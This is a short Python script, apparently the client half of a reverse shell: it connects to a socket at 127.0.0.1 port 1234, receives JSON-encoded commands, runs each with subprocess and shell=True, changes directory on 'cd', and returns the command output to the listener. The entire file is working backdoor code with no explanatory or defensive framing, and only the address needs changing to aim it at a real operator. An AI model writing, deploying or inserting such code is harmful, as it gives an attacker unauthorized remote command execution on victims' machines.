import socket
import json
import subprocess as su
import os

def j_send(data):
    jsondata = json.dumps(data)
    sock.send(jsondata.encode())

def j_recv():

    data = ''

    while True:
        try:
            data = data + sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def shell():
    while True:
        command = j_recv()

        if command == 'quit':
            break

        elif command[:3] == 'cd ':
            os.chdir(command[3:])

        execute = su.Popen(command, shell=True, stdout=su.PIPE, stderr=su.PIPE, stdin=su.PIPE)
        result = (execute.stdout.read() + execute.stderr.read()).decode()
        j_send(result)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('127.0.0.1', 1234))
shell()
